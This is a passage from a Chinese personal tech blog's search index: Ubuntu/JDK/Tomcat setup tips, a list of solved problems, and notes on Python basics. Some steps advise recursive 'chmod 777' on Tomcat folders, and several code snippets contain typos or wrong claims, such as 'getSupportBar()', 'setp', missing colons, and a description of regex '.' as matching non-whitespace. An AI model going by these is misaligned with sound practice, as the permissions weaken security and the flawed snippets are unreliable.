下载：`wps_symbol_fonts.zip`\n2. 创建目录：`sudo mkdir /usr/share/fonts/wps-office`\n3. 将下载的字体复制到创建的目录：`sudo cp -r wps_symbol_fonts.zip /usr/share/fonts/wps-office`\n4. 解压字体包：`sudo unzip wps_symbol_fonts.zip`\n5. 解压后删除字体包：`sudo rm -r wps_symbol_fonts.zip`\n   ps:安装 wps 去[英文官网](www.wps.com)下载（更新更快）\n\n#### AS 报错 unable to sun mksdcard\n\nAndroid Studio 报错 unable to run mksdcard sdk tool  \n打开终端输入`sudo apt-get install lib32stdc++6`\n\n#### 离线安装包安装和配置JDK\n\n```\nsudo su\nmkdir /usr/java\ncp /home/gray/Downloads/xxx.tar.gz /usr/java\ntar -zxvf xxx.tar.gz\nvim /etc/profile\ni (editing mode)\n//末尾添加\nexport JAVA_HOME=/usr/java/jdk1.x.xx\nexport PATH=$JAVA_HOME/bin:$PATH\nesc //退出编辑模式\n:wq! //保存并退出\n```\n\n#### 安装 tomcat\n\n1. 下载tar.gz安装包，解压到想安装的位置开始配置\n2. `vim /etc/profile 添加`\n3. `export CATALINA_HOME=解压的位置`\n4. 进入tomcat bin目录\n5. `vim catalina.sh`\n6. 找到这行# OS specific support. $var _must_ be set to either true or false.\n7. 在这行下面新增如下配置语句\n   `CATALINA_HOME=...`\n   `JAVA_HOME=...`\n8. 安装tomcat服务\n9. `cp catalina.sh /etc/init.d/tomcat`\n10. 启动和关闭tomcat\n11. `service tomcat start（stop）`\n\n#### 安装 MySql\n\n1. `sudo apt-get install mysql-server mysql-client`\n2. Eclipse添加tomcat时显示 tomcat unknown version of tomcat was specified\n3. 因为配置tomcat需要访问tomcat目录下的lib库。\n   通过如下命令：\n   `chmod -R 777 apache-tomcat-xxx/lib`\n   Eclipse无法新建服务器时需要获得tomcat目录执行权限\n   `sudo chmod 777 tomcatdir -R`\n\n#### 添加快捷方式（Intellij-IDEA为例）\n\n- `sudo vim /usr/share/applications/intellij-idea.desktop`\n\n```\n[Desktop Entry]\nName=IntelliJ IDEA\nExec=/home/xring/Tools/idea-IU-141.1532.4/bin/idea.sh\nComment=IntelliJ IDEA\nIcon=/home/xring/Tools/idea-IU-141.1532.4/bin/idea.png\nType=Application\nTerminal=false\nEncoding=UTF-8\n```\n\n- `sudo chmod +x /usr/share/applications/intellij-idea.desktop`\n\n#### eclipse 创建 AVD 模拟器报错 failed to create the sd card\n\n两种情况：\n\n1. 设置android sdk下的tools权限为可执行权限。`Chmod +x tools目录`\n2. 没有安装ia32-libs  \n   1)，在用的架构:\n   `dpkg --print-architecture`\n   输出当前的使用的架构，比如amd64  \n   2)，添加架构\n   `dpkg --add-architecture i386`\n   添加i386架构，然后刷新下源列表，当然，删除就是remove\n   `apt-get update`\n   这时就已经包含i386的软件列表  \n   3)，安装i386软件\n   `apt-get install iceweasel:i386`","tags":["tips","Ubuntu"]},{"title":"解决的问题","url":"/2018/02/25/solved-problems/","content":"\n\n::: danger\n\n已经不再更新\n\n:::\n\n我会把平时遇到并且成功解决的一些小问题写在这里。\n\n## Ubuntu 设置 python3 为默认\n`sudo update-alternatives --install /usr/bin/python python /usr/bin/python2 100` \n\n`sudo update-alternatives --install /usr/bin/python python /usr/bin/python3 150`\n\n如果要切换回 python2 \n\n`sudo update-alternatives --config python` \n\n根据提示输入选择数字回车即可。\n\n## Ubuntu 开机显示您的网络有 .local 域\n用你喜欢的编辑器（vim 或 gedit等）将 /etc/default/avahi-daemon 文件中的参数改为 AVAHI_DAEMON_DETECT_LOCAL=0 即可。（原来等于 1）\n\n## Ubuntu 优化加速\n使用 man systemd-analyze 查看开机启动项  \n发现禁用占用时间最长的 NetworkManager-wait-online.service  \n使用命令 `sudo systemctl disable NetworkManager-wait-online.service` 禁止启动  \n设置 vm.swappiness=10\n1.打开终端，查看交换参数的值大小，输入命令:  \n`cat /proc/sys/vm/swappiness`  \n使用下列命令可临时将交换参数改为10，重启之后仍会恢复原状，变为60:  \n`sudo sysctl vm.swappiness=10`  \n永久的改变该参数，用下列命令:\n`gksudo gedit /etc/sysctl.conf`\n搜索关键字 “vm.swappiness”（无引号），改成你愿意的值。如果 vm.swappiness 不存在，可在文件末尾添加:\n`vm.swappiness=10`，完毕，保存文件，重启即可。  \n\nPreload 是一个运行于后台的监护程序，探测那些常用的软件，并将其放入缓存，以起到加速的作用。  \n在LinuxMint/Ubuntu下安装Preload很简单：  \n`sudo apt-get install preload`  \nPreload 默认的配置对于普通用户而言已经不错了，一般不需要修改。如果有进一步掌控其的欲望，可以打开其配置文件进行修改：  \n`sudo gedit /etc/preload.conf`\n\n## chrome 长截图\n进入开发者模式(f12)，ctrl + shift + p 输入 capture full size screenshot 即可。\n模拟移动断则使用 ctrl + shift + m。\n\n## 解决 Windows 生成的 zip 文件在 Ubuntu 乱码问题\n使用 -O 命令指定字符集（GBK、GB18030、CP936）解压\n```\nunzip -O GBK zip_name.zip\n```\n\n## 修改 Ubuntu 家目录下的结构\n```\ncd ~/.config/\nvim user-dirs.dirs\n```\n\n## Ubuntu tty 模式调整字体\n一条命令即可，根据提示修改字体大小\n```\nsudo dpkg-reconfigure console-setup\n```\n\n## Anaconda 修改环境名称\nAnaconda 没有相关命令可以直接修改环境名称，这里只能先克隆环境再将原环境删除。\n```\nconda create --name new_name --clone old_name\nconda remove --name old_name --all\n```\n## Ubuntu 清理日志文件\n使用 ncdu 工具来查看大日志文件\n```bash\nsudo apt install ncdu\nsudo ncdu /var/log\n# 例如要删除 mail.log 日志\nsudo dd if=/dev/null of=/var/log/mail.log\n```\n\n## 卸载使用 \"python setup.py install\" 命令安装的包\n进入包含 `setup.py` 的目录\n```bash\n# 安装的时候\npython setup.py install --record log\n# 这时候安装细节都写在 log 文件里了\n# 想要卸载的时候\ncat log | xargs rm -rf\n```\n\n## 删除 Ubuntu 多余内核\n使用命令查看当前内核  \n`uname -a`  \n查看所有内核  \n`dpkg --get-selections | grep linux`  \n删除 `linux-image(headers)-xxxxxx-generic`  \n`sudo apt-get remove linux-image-2.6.32-22-generic`\n\n## Ubuntu 使用 deborphan 命令删除孤儿软件包\n在 ubuntu 中使用 apt 安装一个软件包时会自动安装其他依赖，删除掉这个软件包时，这些依赖也就没有用处了，可以使用下面的命令删除：  \n`sudo apt autoremove`  \n不过 `autoremove` 只会删除经过 `apt` 自动安装的依赖，而自己手动安装的依赖则不会被删除，我们可以使用 `deborphan` 来彻底删除：\n```bash\n# 列出孤儿软件包\ndeborphan\n# 将他们删除\ndeborphan | xargs sudo apt purge -y\n```\n\n## Microsoft Word 2016 无法正常撤销\n电脑安装 Word 2016 后，有时候会遇到撤销功能无法正常使用，无论是使用上方的按钮还是使用 ctrl+z 快捷键都不行，按钮始终是灰色的，或者点一下就变灰了。  \n去网上查了查，主要有以上几种解决办法\n- 重装office\n- 更换输入法（Microsoft 官方推荐，然而好像并不管用）\n- 修改注册表（网友说有事时好时坏）  \n\n我是用第三种方法解决的。\n1. win+R 输入 regedit 进入注册表编辑器\n2. 找到 HKEY_CURRENT_USER/Software/Microsoft/Office/15.0/Word/Options\n3. 新建 DWORD 值，名为 UndoHistory，双击修改它的值为 **十进制 0~100** 的数（我填的100）\n4. 如下图所示  \n![图示](https://blog-pics-1302502188.cos.ap-shanghai.myqcloud.com/20200804194050.png)\n另外这里是我的运行环境\n- Windows 10 专业版 1703\n- OS 版本：15063.413\n- Office版本：2016专业版\n\n## 给 AppCompatActivity 的标题栏加上返回按钮\n在 Activity 的 onCreate 方法中加入如下代码\n```Java\nandroid.support.v7.app.ActionBar actionBar = getSupportBar();\nif (actionBar != null) {\n  actionBar.setHomeButtonEnabled(true);\n  actionBar.setDisplayHomeAsUpEnabled(true);\n}\n```\n在 onOptionsItemSelected 中加入如下代码\n```Java\n@Override\npublic boolean onOptionsItemSelected(MenuItem item) {\n  switch (item.getItemId()) {\n    case android.R.id.home :\n    this.finish();\n    return true;\n  }\n  return super.onOptionsItemSelected(item);\n}\n```\n运行效果如下  \n![运行效果](https://blog-pics-1302502188.cos.ap-shanghai.myqcloud.com/20200804194108.png)\n\n## 隐藏 AppCompatActivity 的标题栏\n在 Android Studio 新建 Activity，如果继承自 AppCompatActivity\n使用 `requestWindowFeature(Window.FEATURE_NO_TITLE);`  \n是没有办法隐藏标题栏的。  \n解决方案：\n- 不继承 AppCompatActivity  \n或者\n- 在 setContentView 方法后添加一句:  \n  `getSupportActionBar().hide();`\n\n## Android Studio 导入项目的正确步骤\n1. 打开 Project 中的 build.gradle, 修改 dependicies 为自己本地的版本\n2. 打开 Project 中 gradle-wrapper.properties, 将 distributionUrl修改为自己本地的版本\n3. 打开 app 中的 build.gradle, 修改 compileSdkVersion 和 buildToolsVersion 为自己本地的版本\n\n## Ubuntu 下 Sublime Text 3 无法输入中文\n保存下面的代码到文件sublime_imfix.c(位于~目录)\n``` c\n#include <gtk/gtkimcontext.h>\nvoid gtk_im_context_set_client_window (GtkIMContext *context,\n         GdkWindow    *window)\n{\n GtkIMContextClass *klass;\n g_return_if_fail (GTK_IS_IM_CONTEXT (context));\n klass = GTK_IM_CONTEXT_GET_CLASS (context);\n if (klass->set_client_window)\n   klass->set_client_window (context, window);\n g_object_set_data(G_OBJECT(context),\"window\",window);\n if(!GDK_IS_WINDOW (window))\n   return;\n int width = gdk_window_get_width(window);\n int height = gdk_window_get_height(window);\n if(width != 0 && height !=0)\n   gtk_im_context_focus_in(context);\n}\n```\n将上一步的代码编译成共享库libsublime-imfix.so，命令  \n`gcc -shared -o libsublime-imfix.so sublime_imfix.c  pkg-config --libs --cflags gtk+-2.0 -fPIC`  \n如果提示 gtk/gtkimcontext.h：没有那个文件或目录，那就是没有相关的依赖软件，安装命令：  \n`sudo apt-get install build-essential libgtk2.0-dev`  \n然后将libsublime-imfix.so拷贝到sublime_text所在文件夹  \n`sudo mv libsublime-imfix.so /opt/sublime_text/`  \n修改文件/usr/bin/subl的内容  \n`sudo gedit /usr/bin/subl`  \n将  \n`#!/bin/sh`  \n`exec /opt/sublime_text/sublime_text \"$@\"`  \n修改为  \n`#!/bin/sh`  \n`LD_PRELOAD=/opt/sublime_text/libsublime-imfix.so exec /opt/sublime_text/sublime_text \"$@\"`  \n此时，在命令中执行 subl 将可以使用搜狗for linux的中文输入\n为了使用鼠标右键打开文件时能够使用中文输入，还需要修改文件 sublime_text.desktop 的内容。  \n`sudo gedit /usr/share/applications/sublime_text.desktop`  \n将[Desktop Entry]中的字符串  \n`Exec=/opt/sublime_text/sublime_text %F`  \n修改为  \n`Exec=bash -c \"LD_PRELOAD=/opt/sublime_text/libsublime-imfix.so exec /opt/sublime_text/sublime_text %F\"`  \n将[Desktop Action Window]中的字符串  \n`Exec=/opt/sublime_text/sublime_text -n`  \n修改为  \n`Exec=bash -c \"LD_PRELOAD=/opt/sublime_text/libsublime-imfix.so exec /opt/sublime_text/sublime_text -n\"`  \n将[Desktop Action Document]中的字符串  \n`Exec=/opt/sublime_text/sublime_text --command new_file`  \n修改为  \n`Exec=bash -c \"LD_PRELOAD=/opt/sublime_text/libsublime-imfix.so exec /opt/sublime_text/sublime_text --command new_file\"`  \n注意：修改时请注意双引号\"\",否则会导致不能打开带有空格文件名的文件。\n此处仅修改了 /usr/share/applications/sublime-text.desktop，但可以正常使用了。/opt/sublime_text/目录下的 sublime-text.desktop 可以修改，也可不修改。\n\n## 清除 ubuntu 卸载软件后残留的快捷方式\n1. 将 `/usr/share/applications/` 目录下的 xxx.desktop 删除\n2. 将 `~/.local/share/applications/` 目录下的相关文件删除\n3. 将 `~/.config/menus/applications-merged/` 目录下相关的文件删除\n\n## 使用 VSCode 运行 JavaScript\n1. 新建目录，当作 JavaScript 的 WorkSpace，进入该目录\n2. 新建 .vscode 文件夹，在文件夹下新建 tasks.json 文件\n3. 向该 json 文件中写入如下内容\n\n```json\n{\n    \"version\": \"0.1.0\",\n    \"command\": \"node\",\n    \"isShellCommand\": true,\n    \"args\": [\n        \"${file}\"\n    ],\n    \"showOutput\": \"always\"\n}\n```\n运行 JavaScript 文件： ctrl+shift+b\n\n## 在 Win 10 中使用 mysql-installer 安装 MySQL\n在 Win10 中使用 installer 安装 MySQL 的时候会因为缺少 VC++ 2013 库提示安装 VC++2013（X64），安装完成后安装 MySQL 却报错 install failed，提示缺少 VC++ 2013，刚安装的怎么会没有呢，这个问题困扰了我好久，终于在今天找到了[解决方案](https://stackoverflow.com/questions/45163588/mysql-5-7-installer-fails-to-detect-vs-2013-redistributable/45165995)  \n大概是因为安装程序所需要的 VC++2013 是 32 位的吧，把 32 位的 VC++2013 也安装上就好了。\n\n## 设置 Eclipse 的编码格式\neclipse 在 windows 下默认的编码为 GBK，而常用的格式为 UTF-8，所以稍微不注意就会出现乱码情况，下面来修改 eclipse 默认的编码格式。  \n1. 打开 eclipse 设置，在 general 中找到 workspace，将下面的 text file coding 修改为 UTF-8。\n2. 在设置中搜索 content types，点击右侧的 text，在下面的 default coding 框中填上 UTF-8。\n\n经过以上两步就基本完成设置了，新建项目，右键 properties 检查编码格式是否正确。","tags":["tips"]},{"title":"集智课堂之 Python 学习","url":"/2018/02/14/jizhi-python-learning/","content":"\n这是在集智课堂学习[深度学习所需的 Python 基础](https://jizhi.im/course/dl_python)课程笔记。  \n## 基本概念\n### hello world\n\n```python\nprint(\"hello world\")\n```\n\n### Python\n解释型语言 --逐行运行。\n### 变量\n使用 `type()` 函数得到变量类型。  \n不同类型变量无法相加。  \n运行 `help()` 进入帮助模式，输入 `keywords` 得到关键字列表。  \n变量类型转换可以使用 `float()`, `int()`, `str()` 等函数。\n\n### 数值\nPython 支持的 3 种数值类型：`int`， `float`， `complex`（复数）。  \n指数运算符是 `**`，`^` 在 Python 中表示二进制按位运算。  \nPython 不支持一元加减操作（`++` 或 `--`）。\n### 布尔值\n和其他语言类似\n### 字符串\n可以用 `str()` 函数将其他类型变量转为字符串。  \n可以通过 字符串变量名[索引值] 的方法访问字符串中某个具体的字符。  \n`+` 号可以拼接两个字符串，`*` 号可以复制字符串。  \n可以通过 字符串变量名 `[start:end]` 对字符串进行切割，返回第 `start` 到 `end-1` 的字符，负数索引表示倒数，最后一个字符即是 `[-1]`。  \n`in` 和 `not in` 可以判断一个字符串是否包含另一个字符串，也叫成员运算符。  \n字符串常用函数：\n\n函数名 | 函数返回值\n:-: | :-\nlen() | 返回字符串长度\nmax() | 返回字符串 ASCII 最大的字符\nmin() | 返回字符串 ASCII 最小的字符\nord() | 返回字符对应的 ASCII 编码\nchr() | 返回 ASCII 编码所代表的字符\n## 进阶对象\n### 关系运算符\n`if` 语句\n```python\nif condition1:\n    # branch\nelif condition2:\n    # branch\nelse\n    # 什么也不做用 pass 填充\n```\n### 控制流-1\n`for` 循环\n```python\nfor i in iterable_object:\n    # loop body\n```\n`range()` 函数\n```python\nfor i in range(3):\n    # i -> 0, 1, 2\nfor i in range(2, 5):\n    # i -> 2, 3, 4  range(a,b)中，如果 a > b，则返回空数组\nfor i in range(0, 6, 2):\n    # i -> 0, 2, 4  第三个数是步长\n```\n`while` 循环\n```python\nwhile condition:\n    # loop body\n```\n### 控制流-2\n`break` 语句和 `continue` 语句\n### 列表\n通过 `,` 分隔，由 `[ ]` 包含。  \n列表的元素可以是不同类型，列表本身也可以作为元素。  \n创建列表可以通过：\n```python\nl = [ ]\nl = list()\nl = list(\"jizhi\") # l = ['j', 'i', 'z', 'h', 'i']\n```\n`len()` 函数可以获取列表元素个数。  \n列表的访问和切割与字符串类似，`[ ]` 内写索引值或 `start:end`。  \n`+` 用于拼接， `*` 复制列表内元素。  \n常用列表方法如下\n\n|       方法       | 输入值类型 | 返回值类型 |                   描述                    |\n| :--------------: | :--------: | :--------: | :---------------------------------------: |\n|    append(x)     |   object   |    None    |  在 list 的最后添加一个元素，没有返回值   |\n|     count(x)     |   object   |    int     | 返回元素 x 在 list 中出现的次数，返回整数 |\n|    extend(l)     |    list    |    None    |       将列表 l 中的元素全部 append        |\n|     index(x)     |   object   |    int     |     返回列表中出现的第一个 x 的索引值     |\n| insert(index, x) |    int     |    None    |        将元素 x 插入到指定索引位置        |\n|    remove(x)     |   object   |    None    |      从列表中提出第一个出现的元素 x       |\n|    reverse()     |    None    |    None    |               倒转列表元素                |\n|      sort()      |    None    |    None    |               正序排列元素                |\n|    sorted(l)     |    list    |    list    |          对列表 l 临时排序并返回          |\n|      pop(i)      |    int     |   object   |         删除并返回指定位置的元素          |\n\n列表推导式\n\n```python\nl1 = [x for x in range(10)]\n# [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]\n# 创建0-9的列表\nl2 = [x + 1 for x in range(10)]\n# [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]\n# 创建1-10的列表\nl3 = [x for x in range(10) if x % 2 ==0]\n# [0, 2, 4, 6, 8]\n# 10以内偶数列表\n```\n### 字典\n字典也即是 Python 中的键值对。  \n添加或修改字典中元素直接用 `=` 给目标复制即可。  \n删除某个键值对直接用 `del` ，后面空格接对应的键就可以。  \n`del heros[\"superman\"]`  \n字典循环\n```python\nfor key in heros:\n    # loop body\n```\n字典常用方法\n\n方法 | 描述\n:-: | :-:\npopitem() | 返回并删除一个随机元素\nclear() | 删除字典内所有元素\nkeys() | 返回字典的所有键\nvalues() | 返回字典的所有值\nget(key) | 返回键对应的值，不存在则返回 None\npop(key) | 翻出并返回键对应值\n### 元组\n元组和列表相近，但是元组使用圆括号`( )`而不是方括号`[ ]`来标志，**元组一旦创建，就不能再添加、删除或修改其中的元素，元组是不可修改的**，这一点和字符串性质相同  \n#### 创建元组\n```python\n# 创建空元组\nt1 = ()\n# 直接创建元组\nt2 = (1, 2, 3, 4)\n# 从数组创建\nt3 = tuple([1, 2, 3, 4])     # (1, 2, 3, 4)\n# 从字符串创建\nt4 = tuple(\"谈笑风生\")        # ('谈', '笑', '风', '生')\n```\n元组关键字是 `,` 而不是 `()`。\n### 变性不变性\n列表是 `可变的(mutable)`，我们删改其中的元素，该列表在内存中的地址还是一样的。  \n字符串是`不可变的(immutable)`，修改后产生新字符串后旧字符串失去引用则被内存回收。\n```python\n# 创建变量 str1，指向值 \"jizhi\"\nstr1 = \"jizhi\"\nprint(id(str1))\n\n# 尝试改变 str1，但其实并没有改变值 \"jizhi\"\nstr1 += \".im\"\n\n# str1 只是指向了另一个值 \"jizhi.im\"\nprint(id(str1))\n```\n## 面向对象\n### 文件\n对文件的基本操作\n```python\nopen(\"test.txt\", \"r\")\n# 第一个参数是目标文件名，第二个参数 r 代表只读， w 代表写入， a 代表增补\n\nf = open(\"test.txt\", \"r\")\n# f 变量并不是文本内容，类型为 TextIOWrapper，内容包含文件名(name)，打开方式(mode)和编码格式(encoding)三个参数\n\nnovel = f.read()\n# f 是 TextIOWrapper对象，需要 read()方法才能得到文件内容,read() 函数的返回值是字符串类型的值\n```\n### 函数\n定义函数\n```python\ndef function(argument):\n    # function body\n    value = 1\n    return value\n```\n### 类和对象\n定义类\n```python\nclass Creature (object): # 括号内是超类\n    # statements\n    pass # 表示这个类什么也不做\n```\n实例变量：使用构造器\n```python\nclass Person:\n    def __init__(self, name):\n        self.name = name\n\n    def getName(self):\n        return self.name\n\ngreenlihui = Person(\"greenlihui\")\ngreenlihui.getName() # print 这行语句会得到 greenlihui\n```\nPython 所有方法第一个参数都是 `self`，该参数指代调用该方法的对象；调用方法时，不需要传入 `self` 参数，Python 解释器会自动完成这一步。\n### 类和对象-2\n#### 隐藏实例变量  \n在前面的程序中，Person 被实例化并赋予名字后，其对象的名字依然可以 通过 `object.name = \"\"` 被修改，但是我们不希望可以这样，所以需要隐藏这些实例变量，即定义 `私有实例变量`。在 Python 中，以两条下划线 `__` 开头的变量就是私有实例变量，方法同样可以定义为私有，也是两条下划线开头。  \n还有一种情况是变量名前面有单下划线 `_`，这种叫做 `保护变量`，只有类及其子类可以访问。  \n构造器方法 `__init__()` 前后都有 `__` ，这种前后都有双下划线的写法，是 Python 内置特殊方法的标志，我们命名方法时应避免这种情况。\n#### 运算符重载  \n我们可以用 `+` 进行数学运算，也可以进行字符串拼接，在这两种情形中 `+` 完全是不同的含义。因为 `+` 运算符在 `int` 类和 `str` 类中分别进行了重载。如果想在自定义的对象中使用 `+`，则需要定义名为 `__add__` 的方法。  \n在下面的例子中，定义类几何图形 圆 的类，重载了运算符`+`，我们可以使用 `+` 使两个圆半径相加求出和。\n```python\nimport math\nclass Circle:\n    def __init__(self, radius):\n        self.__radius = radius\n    \n    def setRadius(self, radius):\n        self.__radius = radius\n    \n    def getRadius(self, radius):\n        return self.__radius\n\n    def area(self):\n        return math.pi * self.__radius ** 2\n    \n    def __add__(self, another_circle):\n        return Circle(self.__radius + another_circle.__radius)\n\nc1 = Circle(4)\nc2 = Circle(5)\nc3 = c1 + c2 # 此时，c3 是半径为 9 的圆对象\n```\nPython 还提供很多其他的运算符可供重载，如下：\n\n| 运算符  |         函数         |   描述   |\n| :-----: | :------------------: | :------: |\n|    +    |   add(self, other)   |   加法   |\n|    -    |   sub(self, other)   |   减法   |\n|    *    |   mul(self, other)   |   乘法   |\n|    /    | truediv(self, other) |   除法   |\n|    %    |   mod(self, other)   |   余数   |\n|    <    |   lt(self, other)    |   小于   |\n|   <=    |   le(self, other)    | 小于等于 |\n|   ==    |   eq(self, other)    |   等于   |\n|   !=    |   ne(self, other)    |  不等于  |\n|    >    |   gt(self, other)    |   大于   |\n|   >=    |   ge(self, other)    | 大于等于 |\n| [index] | getitem(self, index) |   索引   |\n|   in    |       contains       |   从属   |\n|   len   |      len(self)       | 元素个数 |\n|   str   |       str(len)       | 字符表征 |\n\n**重载函数前后要加双下划线**\n### 继承与派生\n#### 创建子类\n\n```python\nclass sub_class(super_class):\n    # 实例变量\n    # 实例方法\n```\n\n继承基本思想不做过多阐述，与 `C#`，`Java` 这些语言不同，Python 允许多重继承。\n\n```python\nclass Subclass(SuperClass1, SuperClass2, ...):\n    # initializer\n    # methods\n```\n## 花式操作\n### 用户输入\n```python\nmessage = input(\"Tell me something, and I will repeat it back to you: \")\n# 上面这行语句会输出括号内的提示字符串，然后等待用户输入赋值给 message 变量\nprint(message)\n```\n类似地，使用函数 `int()` 可以获取数值输入。（括号内同样可以把提示作为参数）\n### Lambda 函数\n`Lambda` 函数很简单，只能包含一个表达式，表达式的结果就是 `Lambda` 函数的值，不需要单独设定 `return` 关键字。  \n```python\n# 乘法的普通函数实现方式\ndef multiply(x, y):\n    return x * y\n\n# 用 Lambda 实现方式\nmul = lambda x, y : x * y\nmul(111, 6) # 和 multiply(111, 6) 运行结果一致\n```\n### 函数的参数\n#### 默认参数  \n对于方法头 `def sum(a, b, c=0):`，如果调用函数时没有指定参数 `c`， 则自动代入默认值 `0`。\n#### 任意数量参数  \n`*args` 可以让函数接受任意数量的参数，和 `Java` `...args`参数类似，将若干个输入参数存入一个列表。\n```python\ndef sum(*args):\n    s = 0\n    for i in args:\n        s += i\n    print(\"Sum is:\", s)\n\nprint(sum(1, 2, 3)) # 输出 Sum is: 6\nprint(sum(1, 2, 3, 4)) # 输出 Sum is: 10\n# args 不是强制命名，用 *my_args 也可以\n```\n#### 关键字参数\n`**kwargs` 和 `*args` 类似，区别在于前者接受的参数带有关键字，形式如 `my_func(name='greenlihui', age=20)`；**`kwargs`把参数存入一个字典，用键值对的形式表示特征字与参数的映射关系。**\n```python\ndef my_func(**kwargs):\n    for i in kwargs.items():\n        print(i)\n\nmy_func(name='greenlihui', age=20)\n# 输出如下\n# ('name', 'greenlihui')\n# ('age', 20)\n```\n### 生成器\n#### 迭代器  \n可以循环遍历的数据类型都是`可迭代的`，要判断一个对象是不是可迭代的，只要通过 `isinstance(object, Iterable)` 判断它是否是 `Iterable` 的实例(isinstance 返回 `true` 或者 `false`)。  \n可迭代不代表它是迭代器，迭代器的一大特点就是通过 `next()` 函数可以返回迭代器的下一个元素。或者如果没有下一个元素，则抛出 `StopIteration` 异常。\n```python\nheights = [1, 2, 3, 4]\nheights_iter = iter(heights)\n# 先通过 iter() 函数将列表转化成迭代器\n\nprint(next(heights_iter))\nprint(next(heights_iter))\nprint(next(heights_iter))\nprint(next(heights_iter))\n```\n#### 生成器  \n生成器是用于产生迭代器的函数，所以可用于 for 循环。生成器与函数的定义方法相似，唯一的区别就是用 `yield` 关键字来返回用于每次迭代的值。\n```python\ndef my_range(start, stop, step = 1):\n    i = start\n    while i < stop:\n        yield i\n        i += setp\n\nfor k in my_range(11, 45)\n    print(k)\n# 将会输出整数 11 ～ 44\n```\n### 模块\nPython 中的模块从形式上讲就是一个普通的 Python 文件，里面预存了写好的函数、变量、类和对象。\n#### 导入模块\n```python\n# 导入模块\nimport module_name as mn\nmn.function_name()\n# 导入模块特定函数\nfrom module_name import function_name\nfunction_name()\nfrom module_name import function_0, function_1, function_2\nfunction_0()\n# 导入模块所有函数\nfrom module_name import function_name as func\n```\n#### NumPy  \n`NumPy` 是一个用于数值计算的模块，现在已经和 `SciPy` 合并类。[官方网站](scipy.org) 和 [Quickstart Tutorial](https://docs.scipy.org/doc/numpy-dev/user/quickstart.html) 这里给出，数值计算在深度学习领域中占有重要地位。  \n`NumPy` 提供一种全新的数据结构 `ndarray` (N 维数组，也即高维张量)，与列表有相似之处但是 `ndarray` 内的元素必须是相同的数据类型而且 `ndarray` 的大小是固定的。\n```python\nimport numpy as np\n\n# 矢量相乘\nu = np.array([1, 1, 4])\nv = np.array([5, 1, 4])\na = np.dot(u, v)\n```\n### 正则表达式\nPython 内置正则表达式模块，导入 `import re` 即可使用。\n#### re.search()  \n`search()` 方法用于寻找字符串中第一个匹配模式的部分：\n```python\nimport re\nre.search(pattern, string, flags[optional])\n# 若匹配成功，返回 match 对象，否则返回 None。\n# match 对象拥有 group() 方法，可以输出匹配的字符。\n# pattern 必须是原始字符串(raw strings)，需要在前面加个 r；原始字符串中所有的特殊标识符都变回普通字符，比如 \\n 表示反斜杠 和 n\n```\n示例\n```python\nimport re\ns = \"my number is 123\"\nmatch = re.search(r'\\d\\d\\d', s)\n\nprint(match) # 输出该 <match> 对象\nprint(match.group()) # 输出123\n```\n正则表达式的基本模式：  \n\n|   符号   |               匹配               |\n| :------: | :------------------------------: |\n|    .     |     除开空白字符外的任意字符     |\n|    \\w    | 任意词汇字符，如字母数字和下划线 |\n|    \\W    |            非词汇字符            |\n|    \\d    |             单个数字             |\n|    \\D    |            非单个数字            |\n|    \\s    |   空白字符，如 \\n,\\t, space 等   |\n|    \\S    |            非空白字符            |\n|  [abc]   |           集合中的字符           |\n|  [^abc]  |           集合外的字符           |\n|  [a-z]   |        范围在 a-z 的字符         |\n| [a-zA-Z] |     范围在 a-z 或 A-Z 的字符     |\n|  [0-9]   |      范围在 0-9 之间的字符       |\n|    ^     |          匹配字符串开头          |\n|    $     |          匹配字符串结尾          |\n|    +     |     匹配前一个字符一次或多次     |\n|    *     |     匹配前一个字符零次或多次     |\n\n[这是一个关于 Python 正则表达式详细说明的博文](https://www.cnblogs.com/huxi/archive/2010/07/04/1771073.html)\n\n#### 捕获组(group capturing)  \n捕获组可以进一步从匹配字符串中提取出符合条件的特定部分，建立组的方法是括号 `( )`，假设我们想从电子邮件中提取出“姓名”和“域名”，则需要用`( )`把相应部分括起来。  \n[邮箱正则表达式推导过程](http://blog.csdn.net/make164492212/article/details/51656638)\n```python\nimport re\ns = \"my email is greenlihui@live.com\"\nmatch = re.search(r'[a-zA-Z0-9_-]+@[a-zA-Z0-9_-]+(\\.[a-zA-Z0-9_-]+)+', s)\n\nif match:\n    print(match.group()) # 此时输出 greenlihui@live.com\nelse:\n    print(\"match not found\")\n\n# 分别提取出姓名和域名\nmatch2 = re.search(r'([a-zA-Z0-9_-]+)@([a-zA-Z0-9_-]+(\\.[a-zA-Z0-9_-]+)+)', s)\n\nif match2:\n    print(match2.group()) # 输出 greenlihui@live.com\n    print(match2.group(1)) # 输出 greenlihui\n    print(match2.group(2)) # 输出 live.com\nelse:\n    print(\"match not found\")\n```\n#### findall()  \n前面的 `search()` 方法只能返回第一个匹配模式的字符串，要找到所有匹配的字符串结果就要使用 `findall()` 方法。  \n```python\nimport re\ns = \"My telephone number are 12345-54321 and 23456-65432\"\nmatch = re.findall(r'\\d{5}', s)\n\nif match:\n    print(match) # 输出 ['12345', '54321', '23456', '65432]\n```\n对于 `findall` 也可以使用捕获组，返回的是由**元组**构成的**列表**。\n```python\nimport re\ns = \"My telephone number are 12345-54321 and 23456-65432\"\nmatch = re.findall(r'(\\d{5})-(\\d{5})', s)\n\nprint(match)\n# 输出 [('12345', '54321'), ('23456', '65432')]\n\nfor i in match:\n    print(i)\n    print(\"First group\", i[0])\n    print(\"Second group\", i[1])\n\n# 输出\n# ('12345', '54321')\n# First group 12345\n# Second group 54321\n# ('23456', '65432')\n# First group 23456\n# Second group 65432\n```\n#### match()  \n`match()` 和 `search()` 很接近，区别就是 `match()` 从字符串开头进行匹配；如果在 `search()` 中应用 ^ 表达式，可以获得和 `match()` 相同的效果。\n```python\nimport re\ns = \"python tuts\"\nmatch = re.match(r'py', s)\nif match:\n    print(match.group())\n# 输出 py\n\nmatch2 = re.search(r'^py', s)\nif match2:\n    print(match2.group())\n# 同样输出 py\n```\n### 异常处理\nPython 中异常处理的步骤关键字是 `try-except`，过程一般如下：\n```python\ntry:\n    # 可能产生异常的代码\nexcept <ExceptionType1>:\n    # 异常处理\nexcept <ExceptionType2>:\n    # 异常处理\nexcept:\n    # 异常处理\n```\nPython 中可以用 `else` 或者 `finally` 来控制程序结构，语法格式和 `try` 和 `except` 并列； `else` 中的代码只有在未发生异常时才会执行； `finally` 中的代码无论是否发生异常都会执行。\n#### 抛出异常  \n除了代码出错产生的异常，自己有时候也可以通过 `raise exception`(exception 为异常对象) 制造一些异常。\n#### 捕捉异常\n用 `raise` 